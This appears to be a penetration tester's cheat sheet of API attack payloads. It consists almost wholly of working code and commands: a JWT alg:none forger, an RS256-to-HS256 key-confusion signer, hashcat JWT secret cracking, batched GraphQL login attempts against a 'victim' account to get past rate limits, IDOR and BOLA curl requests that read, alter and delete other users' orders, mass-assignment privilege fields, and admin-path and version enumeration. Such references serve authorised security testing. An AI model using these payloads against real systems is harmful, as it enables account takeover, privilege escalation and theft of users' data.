# API Testing Payload Reference

## JWT Manipulation

### alg:none Payload Generator
```python
import base64, json

def make_none_jwt(payload_claims: dict) -> str:
    header = {"alg": "none", "typ": "JWT"}
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps(payload_claims).encode()).rstrip(b"=").decode()
    return f"{h}.{p}."

# Usage: make_none_jwt({"sub": "1", "role": "admin", "exp": 9999999999})
```

### RS256 → HS256 Confusion
```bash
# Extract the server's public key from a JWT or HTTPS cert
openssl s_client -connect api.example.com:443 2>/dev/null | \
  openssl x509 -pubkey -noout > pubkey.pem

# Sign a modified payload using the public key as HMAC-SHA256 secret
python3 -c "
import hmac, hashlib, base64, json

pubkey = open('pubkey.pem', 'rb').read()
header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({'sub':'1','role':'admin'}).encode()).rstrip(b'=')
msg = header + b'.' + payload
sig = base64.urlsafe_b64encode(hmac.new(pubkey, msg, hashlib.sha256).digest()).rstrip(b'=')
print(f'{msg.decode()}.{sig.decode()}')
"
```

### JWT Secret Brute Force
```bash
# With hashcat (fast, GPU)
hashcat -a 0 -m 16500 "eyJ..." ~/tools/SecLists/Passwords/Common-Credentials/10k-most-common.txt

# With jwt-cracker (slower, dictionary)
jwt-cracker -t "eyJ..." -a "abcdefghijklmnopqrstuvwxyz0123456789"
```

## GraphQL Payloads

### Full Introspection Query
```graphql
{
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
        args { name type { name kind } }
      }
    }
  }
}
```

### Batch Mutation for Rate Limit Bypass
```json
[
  {"query": "mutation { login(email: \"victim@example.com\", password: \"password1\") { token } }"},
  {"query": "mutation { login(email: \"victim@example.com\", password: \"password2\") { token } }"},
  {"query": "mutation { login(email: \"victim@example.com\", password: \"password3\") { token } }"}
]
```

### IDOR via Object Query
```graphql
# Test access to other users' data
{
  user(id: "OTHER_USER_UUID") {
    email
    phone
    address
    paymentMethods { last4 brand }
  }
}

# Test order/resource access
{
  order(id: "OTHER_ORDER_ID") {
    total
    items { name price }
    shippingAddress { street city }
  }
}
```

## Mass Assignment Payloads

Common privileged fields to inject into PATCH/PUT/POST requests:

```json
{
  "role": "admin",
  "is_admin": true,
  "admin": true,
  "is_verified": true,
  "verified": true,
  "email_verified": true,
  "credits": 99999,
  "balance": 99999,
  "subscription_tier": "enterprise",
  "plan": "premium",
  "account_type": "staff",
  "permissions": ["read", "write", "admin"],
  "scope": "admin:all"
}
```

Test by submitting each field individually — bulk injection may be rejected while individual fields pass.

## BOLA Testing Template

```bash
# Setup: two accounts with known resource IDs
ACCOUNT_A_TOKEN="Bearer eyJ..."
ACCOUNT_B_TOKEN="Bearer eyJ..."
ACCOUNT_A_RESOURCE_ID="12345"
ACCOUNT_B_RESOURCE_ID="12346"

BASE="https://api.example.com/v1"

# Test horizontal: A reads B's resource
curl -s -H "Authorization: $ACCOUNT_A_TOKEN" \
  "$BASE/orders/$ACCOUNT_B_RESOURCE_ID"

# Test write: A modifies B's resource
curl -s -X PATCH -H "Authorization: $ACCOUNT_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status": "cancelled"}' \
  "$BASE/orders/$ACCOUNT_B_RESOURCE_ID"

# Test delete
curl -s -X DELETE -H "Authorization: $ACCOUNT_A_TOKEN" \
  "$BASE/orders/$ACCOUNT_B_RESOURCE_ID"
```

## Common Admin Endpoint Paths

```
/api/v1/admin/
/api/v1/admin/users
/api/v1/admin/config
/api/v1/admin/settings
/api/v1/admin/stats
/api/v1/management/
/api/v1/internal/
/api/internal/
/admin/api/
/api/superuser/
/api/staff/
/api/ops/
```

## API Version Enumeration

```bash
BASE="https://api.example.com"
ENDPOINT="/users/me"
TOKEN="Bearer eyJ..."

for version in v0 v1 v2 v3 v4 beta alpha internal legacy; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: $TOKEN" "$BASE/$version$ENDPOINT")
  echo "$version: $status"
done
```

Different status codes between versions (especially 200 vs 403) indicate version-specific auth differences worth investigating.
